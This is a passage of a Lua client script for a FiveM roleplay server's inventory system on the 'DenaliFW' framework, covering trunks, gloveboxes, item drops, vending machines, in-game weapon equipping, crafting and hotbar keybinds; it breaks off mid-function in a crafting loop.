-- Variables

local DenaliFW = exports['denalifw-core']:GetCoreObject()
local inInventory = false
local currentWeapon = nil
local CurrentWeaponData = {}
local currentOtherInventory = nil
local Drops = {}
local CurrentDrop = 0
local DropsNear = {}
local CurrentVehicle = nil
local CurrentGlovebox = nil
local CurrentStash = nil
local isCrafting = false
local isHotbar = false
local showTrunkPos = false
local itemInfos = {}

-- Functions

local function GetClosestVending()
    local ped = PlayerPedId()
    local pos = GetEntityCoords(ped)
    local object = nil
    for _, machine in pairs(Config.VendingObjects) do
        local ClosestObject = GetClosestObjectOfType(pos.x, pos.y, pos.z, 0.75, GetHashKey(machine), 0, 0, 0)
        if ClosestObject ~= 0 and ClosestObject ~= nil then
            if object == nil then
                object = ClosestObject
            end
        end
    end
    return object
end

local function DrawText3Ds(x, y, z, text)
	SetTextScale(0.35, 0.35)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, 215)
    SetTextEntry("STRING")
    SetTextCentre(true)
    AddTextComponentString(text)
    SetDrawOrigin(x,y,z, 0)
    DrawText(0.0, 0.0)
    local factor = (string.len(text)) / 370
    DrawRect(0.0, 0.0+0.0125, 0.017+ factor, 0.03, 0, 0, 0, 75)
    ClearDrawOrigin()
end

local function FormatWeaponAttachments(itemdata)
    local attachments = {}
    itemdata.name = itemdata.name:upper()
    if itemdata.info.attachments ~= nil and next(itemdata.info.attachments) ~= nil then
        for k, v in pairs(itemdata.info.attachments) do
            if WeaponAttachments[itemdata.name] ~= nil then
                for key, value in pairs(WeaponAttachments[itemdata.name]) do
                    if value.component == v.component then
                        item = value.item
                        attachments[#attachments+1] = {
                            attachment = key,
                            label = DenaliFW.Shared.Items[item].label
                            --label = value.label
                        }
                    end
                end
            end
        end
    end
    return attachments
end

local function IsBackEngine(vehModel)
    if BackEngineVehicles[vehModel] then return true end
    return false
end

local function OpenTrunk()
    local vehicle = DenaliFW.Functions.GetClosestVehicle()
    while (not HasAnimDictLoaded("amb@prop_human_bum_bin@idle_b")) do
        RequestAnimDict("amb@prop_human_bum_bin@idle_b")
        Wait(100)
    end
    TaskPlayAnim(PlayerPedId(), "amb@prop_human_bum_bin@idle_b", "idle_d", 4.0, 4.0, -1, 50, 0, false, false, false)
    if (IsBackEngine(GetEntityModel(vehicle))) then
        SetVehicleDoorOpen(vehicle, 4, false, false)
    else
        SetVehicleDoorOpen(vehicle, 5, false, false)
    end
end

local function CloseTrunk()
    local vehicle = DenaliFW.Functions.GetClosestVehicle()
    while (not HasAnimDictLoaded("amb@prop_human_bum_bin@idle_b")) do
        RequestAnimDict("amb@prop_human_bum_bin@idle_b")
        Wait(100)
    end
    TaskPlayAnim(PlayerPedId(), "amb@prop_human_bum_bin@idle_b", "exit", 4.0, 4.0, -1, 50, 0, false, false, false)
    if (IsBackEngine(GetEntityModel(vehicle))) then
        SetVehicleDoorShut(vehicle, 4, false)
    else
        SetVehicleDoorShut(vehicle, 5, false)
    end
end

local function closeInventory()
    SendNUIMessage({
        action = "close",
    })
end

local function ToggleHotbar(toggle)
    local HotbarItems = {
        [1] = DenaliFW.Functions.GetPlayerData().items[1],
        [2] = DenaliFW.Functions.GetPlayerData().items[2],
        [3] = DenaliFW.Functions.GetPlayerData().items[3],
        [4] = DenaliFW.Functions.GetPlayerData().items[4],
        [5] = DenaliFW.Functions.GetPlayerData().items[5],
        [41] = DenaliFW.Functions.GetPlayerData().items[41],
    }

    if toggle then
        SendNUIMessage({
            action = "toggleHotbar",
            open = true,
            items = HotbarItems
        })
    else
        SendNUIMessage({
            action = "toggleHotbar",
            open = false,
        })
    end
end

local function LoadAnimDict( dict )
    while ( not HasAnimDictLoaded( dict ) ) do
        RequestAnimDict( dict )
        Wait( 5 )
    end
end

local function openAnim()
    LoadAnimDict('pickup_object')
    TaskPlayAnim(PlayerPedId(),'pickup_object', 'putdown_low', 5.0, 1.5, 1.0, 48, 0.0, 0, 0, 0)
end

local function ItemsToItemInfo()
	itemInfos = {
		[1] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 22x, " ..DenaliFW.Shared.Items["plastic"]["label"] .. ": 32x."},
		[2] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 30x, " ..DenaliFW.Shared.Items["plastic"]["label"] .. ": 42x."},
		[3] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 30x, " ..DenaliFW.Shared.Items["plastic"]["label"] .. ": 45x, "..DenaliFW.Shared.Items["aluminum"]["label"] .. ": 28x."},
		[4] = {costs = DenaliFW.Shared.Items["electronickit"]["label"] .. ": 2x, " ..DenaliFW.Shared.Items["plastic"]["label"] .. ": 52x, "..DenaliFW.Shared.Items["steel"]["label"] .. ": 40x."},
		[5] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 10x, " ..DenaliFW.Shared.Items["plastic"]["label"] .. ": 50x, "..DenaliFW.Shared.Items["aluminum"]["label"] .. ": 30x, "..DenaliFW.Shared.Items["iron"]["label"] .. ": 17x, "..DenaliFW.Shared.Items["electronickit"]["label"] .. ": 1x."},
		[6] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 36x, " ..DenaliFW.Shared.Items["steel"]["label"] .. ": 24x, "..DenaliFW.Shared.Items["aluminum"]["label"] .. ": 28x."},
		[7] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 32x, " ..DenaliFW.Shared.Items["steel"]["label"] .. ": 43x, "..DenaliFW.Shared.Items["plastic"]["label"] .. ": 61x."},
		[8] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 50x, " ..DenaliFW.Shared.Items["steel"]["label"] .. ": 37x, "..DenaliFW.Shared.Items["copper"]["label"] .. ": 26x."},
		[9] = {costs = DenaliFW.Shared.Items["iron"]["label"] .. ": 60x, " ..DenaliFW.Shared.Items["glass"]["label"] .. ": 30x."},
		[10] = {costs = DenaliFW.Shared.Items["aluminum"]["label"] .. ": 60x, " ..DenaliFW.Shared.Items["glass"]["label"] .. ": 30x."},
		[11] = {costs = DenaliFW.Shared.Items["iron"]["label"] .. ": 33x, " ..DenaliFW.Shared.Items["steel"]["label"] .. ": 44x, "..DenaliFW.Shared.Items["plastic"]["label"] .. ": 55x, "..DenaliFW.Shared.Items["aluminum"]["label"] .. ": 22x."},
		[12] = {costs = DenaliFW.Shared.Items["iron"]["label"] .. ": 50x, " ..DenaliFW.Shared.Items["steel"]["label"] .. ": 50x, "..DenaliFW.Shared.Items["screwdriverset"]["label"] .. ": 3x, "..DenaliFW.Shared.Items["advancedlockpick"]["label"] .. ": 2x."},
	}

	local items = {}
	for k, item in pairs(Config.CraftingItems) do
		local itemInfo = DenaliFW.Shared.Items[item.name:lower()]
		items[item.slot] = {
			name = itemInfo["name"],
			amount = tonumber(item.amount),
			info = itemInfos[item.slot],
			label = itemInfo["label"],
			description = itemInfo["description"] ~= nil and itemInfo["description"] or "",
			weight = itemInfo["weight"],
			type = itemInfo["type"],
			unique = itemInfo["unique"],
			useable = itemInfo["useable"],
			image = itemInfo["image"],
			slot = item.slot,
			costs = item.costs,
			threshold = item.threshold,
			points = item.points,
		}
	end
	Config.CraftingItems = items
end

local function SetupAttachmentItemsInfo()
	itemInfos = {
		[1] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 140x, " .. DenaliFW.Shared.Items["steel"]["label"] .. ": 250x, " .. DenaliFW.Shared.Items["rubber"]["label"] .. ": 60x"},
		[2] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 165x, " .. DenaliFW.Shared.Items["steel"]["label"] .. ": 285x, " .. DenaliFW.Shared.Items["rubber"]["label"] .. ": 75x"},
		[3] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 190x, " .. DenaliFW.Shared.Items["steel"]["label"] .. ": 305x, " .. DenaliFW.Shared.Items["rubber"]["label"] .. ": 85x, " .. DenaliFW.Shared.Items["smg_extendedclip"]["label"] .. ": 1x"},
		[4] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 205x, " .. DenaliFW.Shared.Items["steel"]["label"] .. ": 340x, " .. DenaliFW.Shared.Items["rubber"]["label"] .. ": 110x, " .. DenaliFW.Shared.Items["smg_extendedclip"]["label"] .. ": 2x"},
		[5] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 230x, " .. DenaliFW.Shared.Items["steel"]["label"] .. ": 365x, " .. DenaliFW.Shared.Items["rubber"]["label"] .. ": 130x"},
		[6] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 255x, " .. DenaliFW.Shared.Items["steel"]["label"] .. ": 390x, " .. DenaliFW.Shared.Items["rubber"]["label"] .. ": 145x"},
		[7] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 270x, " .. DenaliFW.Shared.Items["steel"]["label"] .. ": 435x, " .. DenaliFW.Shared.Items["rubber"]["label"] .. ": 155x"},
		[8] = {costs = DenaliFW.Shared.Items["metalscrap"]["label"] .. ": 300x, " .. DenaliFW.Shared.Items["steel"]["label"] .. ": 469x, " .. DenaliFW.Shared.Items["rubber"]["label"] .. ": 170x"},
	}

	local items = {}
	for k, item in pairs(Config.AttachmentCrafting["items"]) do
		local itemInfo = DenaliFW.Shared.Items[item.name:lower()]
		items[item.slot] = {
			name = itemInfo["name"],
			amount = tonumber(item.amount),
			info = itemInfos[item.slot],
			label = itemInfo["label"],
			description = itemInfo["description"] ~= nil and itemInfo["description"] or "",
			weight = itemInfo["weight"],
			unique = itemInfo["unique"],
			useable = itemInfo["useable"],
			image = itemInfo["image"],
			slot = item.slot,
			costs = item.costs,
			threshold = item.threshold,
			points = item.points,
		}
	end
	Config.AttachmentCrafting["items"] = items
end

local function GetThresholdItems()
	ItemsToItemInfo()
	local items = {}
	for k, item in pairs(Config.CraftingItems) do
		if DenaliFW.Functions.GetPlayerData().metadata["craftingrep"] >= Config.CraftingItems[k].threshold then
			items[k] = Config.CraftingItems[k]
		end
	end
	return items
end

local function GetAttachmentThresholdItems()
	SetupAttachmentItemsInfo()
	local items = {}
	for k, item in pairs(Config.AttachmentCrafting["items"]) do
		if DenaliFW.Functions.GetPlayerData().metadata["attachmentcraftingrep"] >= Config.AttachmentCrafting["items"][k].threshold then
			items[k] = Config.AttachmentCrafting["items"][k]
		end
	end
	return items
end

-- Events

RegisterNetEvent('DenaliFW:Client:OnPlayerLoaded', function()
    LocalPlayer.state:set("inv_busy", false, true)
end)

RegisterNetEvent('DenaliFW:Client:OnPlayerUnload', function()
    LocalPlayer.state:set("inv_busy", true, true)
end)

RegisterNetEvent('inventory:client:CheckOpenState', function(type, id, label)
    local name = DenaliFW.Shared.SplitStr(label, "-")[2]
    if type == "stash" then
        if name ~= CurrentStash or CurrentStash == nil then
            TriggerServerEvent('inventory:server:SetIsOpenState', false, type, id)
        end
    elseif type == "trunk" then
        if name ~= CurrentVehicle or CurrentVehicle == nil then
            TriggerServerEvent('inventory:server:SetIsOpenState', false, type, id)
        end
    elseif type == "glovebox" then
        if name ~= CurrentGlovebox or CurrentGlovebox == nil then
            TriggerServerEvent('inventory:server:SetIsOpenState', false, type, id)
        end
    end
end)

RegisterNetEvent('weapons:client:SetCurrentWeapon', function(data, bool)
    if data ~= false then
        CurrentWeaponData = data
    else
        CurrentWeaponData = {}
    end
end)

RegisterNetEvent('inventory:client:ItemBox', function(itemData, type)
    SendNUIMessage({
        action = "itemBox",
        item = itemData,
        type = type
    })
end)

RegisterNetEvent('inventory:client:requiredItems', function(items, bool)
    local itemTable = {}
    if bool then
        for k, v in pairs(items) do
            itemTable[#itemTable+1] = {
                item = items[k].name,
                label = DenaliFW.Shared.Items[items[k].name]["label"],
                image = items[k].image,
            }
        end
    end

    SendNUIMessage({
        action = "requiredItem",
        items = itemTable,
        toggle = bool
    })
end)

RegisterNetEvent('inventory:server:RobPlayer', function(TargetId)
    SendNUIMessage({
        action = "RobMoney",
        TargetId = TargetId,
    })
end)

RegisterNetEvent('inventory:client:OpenInventory', function(PlayerAmmo, inventory, other)
    if not IsEntityDead(PlayerPedId()) then
        ToggleHotbar(false)
        SetNuiFocus(true, true)
        if other ~= nil then
            currentOtherInventory = other.name
        end
        SendNUIMessage({
            action = "open",
            inventory = inventory,
            slots = MaxInventorySlots,
            other = other,
            maxweight = DenaliFW.Config.Player.MaxWeight,
            Ammo = PlayerAmmo,
            maxammo = Config.MaximumAmmoValues,
        })
        inInventory = true
    end
end)

RegisterNetEvent('inventory:client:UpdatePlayerInventory', function(isError)
    SendNUIMessage({
        action = "update",
        inventory = DenaliFW.Functions.GetPlayerData().items,
        maxweight = DenaliFW.Config.Player.MaxWeight,
        slots = MaxInventorySlots,
        error = isError,
    })
end)

RegisterNetEvent('inventory:client:CraftItems', function(itemName, itemCosts, amount, toSlot, points)
    local ped = PlayerPedId()
    SendNUIMessage({
        action = "close",
    })
    isCrafting = true
    DenaliFW.Functions.Progressbar("repair_vehicle", "Crafting..", (math.random(2000, 5000) * amount), false, true, {
		disableMovement = true,
		disableCarMovement = true,
		disableMouse = false,
		disableCombat = true,
	}, {
		animDict = "mini@repair",
		anim = "fixing_a_player",
		flags = 16,
	}, {}, {}, function() -- Done
		StopAnimTask(ped, "mini@repair", "fixing_a_player", 1.0)
        TriggerServerEvent("inventory:server:CraftItems", itemName, itemCosts, amount, toSlot, points)
        TriggerEvent('inventory:client:ItemBox', DenaliFW.Shared.Items[itemName], 'add')
        isCrafting = false
	end, function() -- Cancel
		StopAnimTask(ped, "mini@repair", "fixing_a_player", 1.0)
        DenaliFW.Functions.Notify("Failed", "error")
        isCrafting = false
	end)
end)

RegisterNetEvent('inventory:client:CraftAttachment', function(itemName, itemCosts, amount, toSlot, points)
    local ped = PlayerPedId()
    SendNUIMessage({
        action = "close",
    })
    isCrafting = true
    DenaliFW.Functions.Progressbar("repair_vehicle", "Crafting..", (math.random(2000, 5000) * amount), false, true, {
		disableMovement = true,
		disableCarMovement = true,
		disableMouse = false,
		disableCombat = true,
	}, {
		animDict = "mini@repair",
		anim = "fixing_a_player",
		flags = 16,
	}, {}, {}, function() -- Done
		StopAnimTask(ped, "mini@repair", "fixing_a_player", 1.0)
        TriggerServerEvent("inventory:server:CraftAttachment", itemName, itemCosts, amount, toSlot, points)
        TriggerEvent('inventory:client:ItemBox', DenaliFW.Shared.Items[itemName], 'add')
        isCrafting = false
	end, function() -- Cancel
		StopAnimTask(ped, "mini@repair", "fixing_a_player", 1.0)
        DenaliFW.Functions.Notify("Failed", "error")
        isCrafting = false
	end)
end)

RegisterNetEvent('inventory:client:PickupSnowballs', function()
    local ped = PlayerPedId()
    LoadAnimDict('anim@mp_snowball')
    TaskPlayAnim(ped, 'anim@mp_snowball', 'pickup_snowball', 3.0, 3.0, -1, 0, 1, 0, 0, 0)
    DenaliFW.Functions.Progressbar("pickupsnowball", "Collecting snowballs..", 1500, false, true, {
        disableMovement = true,
        disableCarMovement = true,
        disableMouse = false,
        disableCombat = true,
    }, {}, {}, {}, function() -- Done
        ClearPedTasks(ped)
        TriggerServerEvent('DenaliFW:Server:AddItem', "snowball", 1)
        TriggerEvent('inventory:client:ItemBox', DenaliFW.Shared.Items["snowball"], "add")
    end, function() -- Cancel
        ClearPedTasks(ped)
        DenaliFW.Functions.Notify("Canceled", "error")
    end)
end)

RegisterNetEvent('inventory:client:UseSnowball', function(amount)
    local ped = PlayerPedId()
    GiveWeaponToPed(ped, `weapon_snowball`, amount, false, false)
    SetPedAmmo(ped, `weapon_snowball`, amount)
    SetCurrentPedWeapon(ped, `weapon_snowball`, true)
end)

RegisterNetEvent('inventory:client:UseWeapon', function(weaponData, shootbool)
    local ped = PlayerPedId()
    local weaponName = tostring(weaponData.name)
    if currentWeapon == weaponName then
        SetCurrentPedWeapon(ped, `WEAPON_UNARMED`, true)
        RemoveAllPedWeapons(ped, true)
        TriggerEvent('weapons:client:SetCurrentWeapon', nil, shootbool)
        currentWeapon = nil
    elseif weaponName == "weapon_stickybomb" or weaponName == "weapon_pipebomb" or weaponName == "weapon_smokegrenade" or weaponName == "weapon_flare" or weaponName == "weapon_proxmine" or weaponName == "weapon_ball"  or weaponName == "weapon_molotov" or weaponName == "weapon_grenade" or weaponName == "weapon_bzgas" then
        GiveWeaponToPed(ped, GetHashKey(weaponName), 1, false, false)
        SetPedAmmo(ped, GetHashKey(weaponName), 1)
        SetCurrentPedWeapon(ped, GetHashKey(weaponName), true)
--         TriggerServerEvent('DenaliFW:Server:RemoveItem', weaponName, 1) -- Commented out as denalifw-weapons handles this in a way it deleted after you have thrown it
        TriggerEvent('weapons:client:SetCurrentWeapon', weaponData, shootbool)
        currentWeapon = weaponName
    elseif weaponName == "weapon_snowball" then
        GiveWeaponToPed(ped, GetHashKey(weaponName), 10, false, false)
        SetPedAmmo(ped, GetHashKey(weaponName), 10)
        SetCurrentPedWeapon(ped, GetHashKey(weaponName), true)
        TriggerServerEvent('DenaliFW:Server:RemoveItem', weaponName, 1)
        TriggerEvent('weapons:client:SetCurrentWeapon', weaponData, shootbool)
        currentWeapon = weaponName
    else
        TriggerEvent('weapons:client:SetCurrentWeapon', weaponData, shootbool)
        DenaliFW.Functions.TriggerCallback("weapon:server:GetWeaponAmmo", function(result)
            local ammo = tonumber(result)
            if weaponName == "weapon_petrolcan" or weaponName == "weapon_fireextinguisher" then
                ammo = 4000
            end
            GiveWeaponToPed(ped, GetHashKey(weaponName), 0, false, false)
            SetPedAmmo(ped, GetHashKey(weaponName), ammo)
            SetCurrentPedWeapon(ped, GetHashKey(weaponName), true)
            if weaponData.info.attachments ~= nil then
                for _, attachment in pairs(weaponData.info.attachments) do
                    GiveWeaponComponentToPed(ped, GetHashKey(weaponName), GetHashKey(attachment.component))
                end
            end
            currentWeapon = weaponName
        end, CurrentWeaponData)
    end
end)

RegisterNetEvent('inventory:client:CheckWeapon', function(weaponName)
    local ped = PlayerPedId()
    if currentWeapon == weaponName then
        TriggerEvent('weapons:ResetHolster')
        SetCurrentPedWeapon(ped, `WEAPON_UNARMED`, true)
        RemoveAllPedWeapons(ped, true)
        currentWeapon = nil
    end
end)

RegisterNetEvent('inventory:client:AddDropItem', function(dropId, player, coords)
    local forward = GetEntityForwardVector(GetPlayerPed(GetPlayerFromServerId(player)))
	local x, y, z = table.unpack(coords + forward * 0.5)
    Drops[dropId] = {
        id = dropId,
        coords = {
            x = x,
            y = y,
            z = z - 0.3,
        },
    }
end)

RegisterNetEvent('inventory:client:RemoveDropItem', function(dropId)
    Drops[dropId] = nil
    DropsNear[dropId] = nil
end)

RegisterNetEvent('inventory:client:DropItemAnim', function()
    local ped = PlayerPedId()
    SendNUIMessage({
        action = "close",
    })
    RequestAnimDict("pickup_object")
    while not HasAnimDictLoaded("pickup_object") do
        Wait(7)
    end
    TaskPlayAnim(ped, "pickup_object" ,"pickup_low" ,8.0, -8.0, -1, 1, 0, false, false, false )
    Wait(2000)
    ClearPedTasks(ped)
end)

RegisterNetEvent('inventory:client:SetCurrentStash', function(stash)
    CurrentStash = stash
end)

-- Commands

RegisterCommand('closeinv', function()
    closeInventory()
end, false)

RegisterCommand('inventory', function()
    if not isCrafting and not inInventory then
        DenaliFW.Functions.GetPlayerData(function(PlayerData)
            if not PlayerData.metadata["isdead"] and not PlayerData.metadata["inlaststand"] and not PlayerData.metadata["ishandcuffed"] and not IsPauseMenuActive() then
                local ped = PlayerPedId()
                local curVeh = nil
                local VendingMachine = GetClosestVending()

                if IsPedInAnyVehicle(ped) then -- Is Player In Vehicle
                    local vehicle = GetVehiclePedIsIn(ped, false)
                    CurrentGlovebox = DenaliFW.Functions.GetPlate(vehicle)
                    curVeh = vehicle
                    CurrentVehicle = nil
                else
                    local vehicle = DenaliFW.Functions.GetClosestVehicle()
                    if vehicle ~= 0 and vehicle ~= nil then
                        local pos = GetEntityCoords(ped)
                        local trunkpos = GetOffsetFromEntityInWorldCoords(vehicle, 0, -2.5, 0)
                        if (IsBackEngine(GetEntityModel(vehicle))) then
                            trunkpos = GetOffsetFromEntityInWorldCoords(vehicle, 0, 2.5, 0)
                        end
                        if #(pos - trunkpos) < 2.0 and not IsPedInAnyVehicle(ped) then
                            if GetVehicleDoorLockStatus(vehicle) < 2 then
                                CurrentVehicle = DenaliFW.Functions.GetPlate(vehicle)
                                curVeh = vehicle
                                CurrentGlovebox = nil
                            else
                                DenaliFW.Functions.Notify("Vehicle Locked", "error")
                                return
                            end
                        else
                            CurrentVehicle = nil
                        end
                    else
                        CurrentVehicle = nil
                    end
                end

                if CurrentVehicle ~= nil then		-- Trunk
                    local vehicleClass = GetVehicleClass(curVeh)
                    local maxweight = 0
                    local slots = 0
                    if vehicleClass == 0 then
                        maxweight = 38000
                        slots = 30
                    elseif vehicleClass == 1 then
                        maxweight = 50000
                        slots = 40
                    elseif vehicleClass == 2 then
                        maxweight = 75000
                        slots = 50
                    elseif vehicleClass == 3 then
                        maxweight = 42000
                        slots = 35
                    elseif vehicleClass == 4 then
                        maxweight = 38000
                        slots = 30
                    elseif vehicleClass == 5 then
                        maxweight = 30000
                        slots = 25
                    elseif vehicleClass == 6 then
                        maxweight = 30000
                        slots = 25
                    elseif vehicleClass == 7 then
                        maxweight = 30000
                        slots = 25
                    elseif vehicleClass == 8 then
                        maxweight = 15000
                        slots = 15
                    elseif vehicleClass == 9 then
                        maxweight = 60000
                        slots = 35
                    elseif vehicleClass == 12 then
                        maxweight = 120000
                        slots = 35
                    elseif vehicleClass == 13 then
                        maxweight = 0
                        slots = 0
                    elseif vehicleClass == 14 then
                        maxweight = 120000
                        slots = 50
                    elseif vehicleClass == 15 then
                        maxweight = 120000
                        slots = 50
                    elseif vehicleClass == 16 then
                        maxweight = 120000
                        slots = 50
                    else
                        maxweight = 60000
                        slots = 35
                    end
                    local other = {
                        maxweight = maxweight,
                        slots = slots,
                    }
                    TriggerServerEvent("inventory:server:OpenInventory", "trunk", CurrentVehicle, other)
                    OpenTrunk()
                elseif CurrentGlovebox ~= nil then
                    TriggerServerEvent("inventory:server:OpenInventory", "glovebox", CurrentGlovebox)
                elseif CurrentDrop ~= 0 then
                    TriggerServerEvent("inventory:server:OpenInventory", "drop", CurrentDrop)
                elseif VendingMachine ~= nil then
                    local ShopItems = {}
                    ShopItems.label = "Vending Machine"
                    ShopItems.items = Config.VendingItem
                    ShopItems.slots = #Config.VendingItem
                    TriggerServerEvent("inventory:server:OpenInventory", "shop", "Vendingshop_"..math.random(1, 99), ShopItems)
                else
                    openAnim()
                    TriggerServerEvent("inventory:server:OpenInventory")
                end
            end
        end)
    end
end)

RegisterKeyMapping('inventory', 'Open Inventory', 'keyboard', 'TAB')

RegisterCommand('hotbar', function()
    isHotbar = not isHotbar
	DenaliFW.Functions.GetPlayerData(function(PlayerData)
        if not PlayerData.metadata["isdead"] and not PlayerData.metadata["inlaststand"] and not PlayerData.metadata["ishandcuffed"] and not IsPauseMenuActive() then
			ToggleHotbar(isHotbar)
		end
	end)
end)

RegisterKeyMapping('hotbar', 'Toggles keybind slots', 'keyboard', 'z')

for i=1, 6 do
    RegisterCommand('slot' .. i,function()
        DenaliFW.Functions.GetPlayerData(function(PlayerData)
            if not PlayerData.metadata["isdead"] and not PlayerData.metadata["inlaststand"] and not PlayerData.metadata["ishandcuffed"] and not IsPauseMenuActive() then
                if i == 6 then
                    i = MaxInventorySlots
                end
                TriggerServerEvent("inventory:server:UseItemSlot", i)
            end
        end)
    end)
    RegisterKeyMapping('slot' .. i, 'Uses the item in slot ' .. i, 'keyboard', i)
end

RegisterNetEvent('denalifw-inventory:client:giveAnim', function()
    LoadAnimDict('mp_common')
	TaskPlayAnim(PlayerPedId(), 'mp_common', 'givetake1_b', 8.0, 1.0, -1, 16, 0, 0, 0, 0)
end)

-- NUI

RegisterNUICallback('RobMoney', function(data, cb)
    TriggerServerEvent("police:server:RobPlayer", data.TargetId)
end)

RegisterNUICallback('Notify', function(data, cb)
    DenaliFW.Functions.Notify(data.message, data.type)
end)

RegisterNUICallback('GetWeaponData', function(data, cb)
    local data = {
        WeaponData = DenaliFW.Shared.Items[data.weapon],
        AttachmentData = FormatWeaponAttachments(data.ItemData)
    }
    cb(data)
end)

RegisterNUICallback('RemoveAttachment', function(data, cb)
    local ped = PlayerPedId()
    local WeaponData = DenaliFW.Shared.Items[data.WeaponData.name]
    local label = DenaliFW.Shared.Items
    local Attachment = WeaponAttachments[WeaponData.name:upper()][data.AttachmentData.attachment]

    DenaliFW.Functions.TriggerCallback('weapons:server:RemoveAttachment', function(NewAttachments)
        if NewAttachments ~= false then
            local Attachies = {}
            RemoveWeaponComponentFromPed(ped, GetHashKey(data.WeaponData.name), GetHashKey(Attachment.component))
            for k, v in pairs(NewAttachments) do
                for wep, pew in pairs(WeaponAttachments[WeaponData.name:upper()]) do
                    if v.component == pew.component then
                        item = pew.item
                        Attachies[#Attachies+1] = {
                            attachment = pew.item,
                            label = DenaliFW.Shared.Items[item].label,
                        }
                    end
                end
            end
            local DJATA = {
                Attachments = Attachies,
                WeaponData = WeaponData,
            }
            cb(DJATA)
        else
            RemoveWeaponComponentFromPed(ped, GetHashKey(data.WeaponData.name), GetHashKey(Attachment.component))
            cb({})
        end
    end, data.AttachmentData, data.WeaponData)
end)

RegisterNUICallback('getCombineItem', function(data, cb)
    cb(DenaliFW.Shared.Items[data.item])
end)

RegisterNUICallback("CloseInventory", function(data, cb)
    if currentOtherInventory == "none-inv" then
        CurrentDrop = 0
        CurrentVehicle = nil
        CurrentGlovebox = nil
        CurrentStash = nil
        SetNuiFocus(false, false)
        inInventory = false
        ClearPedTasks(PlayerPedId())
        return
    end
    if CurrentVehicle ~= nil then
        CloseTrunk()
        TriggerServerEvent("inventory:server:SaveInventory", "trunk", CurrentVehicle)
        CurrentVehicle = nil
    elseif CurrentGlovebox ~= nil then
        TriggerServerEvent("inventory:server:SaveInventory", "glovebox", CurrentGlovebox)
        CurrentGlovebox = nil
    elseif CurrentStash ~= nil then
        TriggerServerEvent("inventory:server:SaveInventory", "stash", CurrentStash)
        CurrentStash = nil
    else
        TriggerServerEvent("inventory:server:SaveInventory", "drop", CurrentDrop)
        CurrentDrop = 0
    end
    SetNuiFocus(false, false)
    inInventory = false
end)
RegisterNUICallback("UseItem", function(data, cb)
    TriggerServerEvent("inventory:server:UseItem", data.inventory, data.item)
end)

RegisterNUICallback("combineItem", function(data)
    Wait(150)
    TriggerServerEvent('inventory:server:combineItem', data.reward, data.fromItem, data.toItem)
end)

RegisterNUICallback('combineWithAnim', function(data)
    local ped = PlayerPedId()
    local combineData = data.combineData
    local aDict = combineData.anim.dict
    local aLib = combineData.anim.lib
    local animText = combineData.anim.text
    local animTimeout = combineData.anim.timeOut

    DenaliFW.Functions.Progressbar("combine_anim", animText, animTimeout, false, true, {
        disableMovement = false,
        disableCarMovement = true,
        disableMouse = false,
        disableCombat = true,
    }, {
        animDict = aDict,
        anim = aLib,
        flags = 16,
    }, {}, {}, function() -- Done
        StopAnimTask(ped, aDict, aLib, 1.0)
        TriggerServerEvent('inventory:server:combineItem', combineData.reward, data.requiredItem, data.usedItem)
    end, function() -- Cancel
        StopAnimTask(ped, aDict, aLib, 1.0)
        DenaliFW.Functions.Notify("Failed!", "error")
    end)
end)

RegisterNUICallback("SetInventoryData", function(data, cb)
    TriggerServerEvent("inventory:server:SetInventoryData", data.fromInventory, data.toInventory, data.fromSlot, data.toSlot, data.fromAmount, data.toAmount)
end)

RegisterNUICallback("PlayDropSound", function(data, cb)
    PlaySound(-1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", 0, 0, 1)
end)

RegisterNUICallback("PlayDropFail", function(data, cb)
    PlaySound(-1, "Place_Prop_Fail", "DLC_Dmod_Prop_Editor_Sounds", 0, 0, 1)
end)

RegisterNUICallback("GiveItem", function(data, cb)
    local player, distance = DenaliFW.Functions.GetClosestPlayer(GetEntityCoords(PlayerPedId()))
    if player ~= -1 and distance < 3 then
        if (data.inventory == 'player') then
            local playerId = GetPlayerServerId(player)
            SetCurrentPedWeapon(PlayerPedId(),'WEAPON_UNARMED',true)
            TriggerServerEvent("inventory:server:GiveItem", playerId, data.item.name, data.amount, data.item.slot)
        else
            DenaliFW.Functions.Notify("You do not own this item!", "error")
        end
    else
        DenaliFW.Functions.Notify("No one nearby!", "error")
    end
end)

-- Threads

CreateThread(function()
    while true do
        Wait(1)
        if DropsNear ~= nil then
            for k, v in pairs(DropsNear) do
                if DropsNear[k] ~= nil then
                    DrawMarker(2, v.coords.x, v.coords.y, v.coords.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.3, 0.3, 0.15, 120, 10, 20, 155, false, false, false, 1, false, false, false)
                end
            end
        end
    end
end)

CreateThread(function()
    while true do
        if Drops ~= nil and next(Drops) ~= nil then
            local pos = GetEntityCoords(PlayerPedId(), true)
            for k, v in pairs(Drops) do
                if Drops[k] ~= nil then
                    local dist = #(pos - vector3(v.coords.x, v.coords.y, v.coords.z))
                    if dist < 7.5 then
                        DropsNear[k] = v
                        if dist < 2 then
                            CurrentDrop = k
                        else
                            CurrentDrop = nil
                        end
                    else
                        DropsNear[k] = nil
                    end
                end
            end
        else
            DropsNear = {}
        end
        Wait(500)
    end
end)

CreateThread(function()
	while true do
		Wait(0)
		local pos, awayFromObject = GetEntityCoords(PlayerPedId()), true
		local craftObject = GetClosestObjectOfType(pos, 2.0, -573669520, false, false, false)
		if craftObject ~= 0 then
			local objectPos = GetEntityCoords(craftObject)
			if #(pos - objectPos) < 1.5 then
				awayFromObject = false
				DrawText3Ds(objectPos.x, objectPos.y, objectPos.z + 1.0, "~g~E~w~ - Craft")
				if IsControlJustReleased(0, 38) then
					local crafting = {}
					crafting.label = "Crafting"
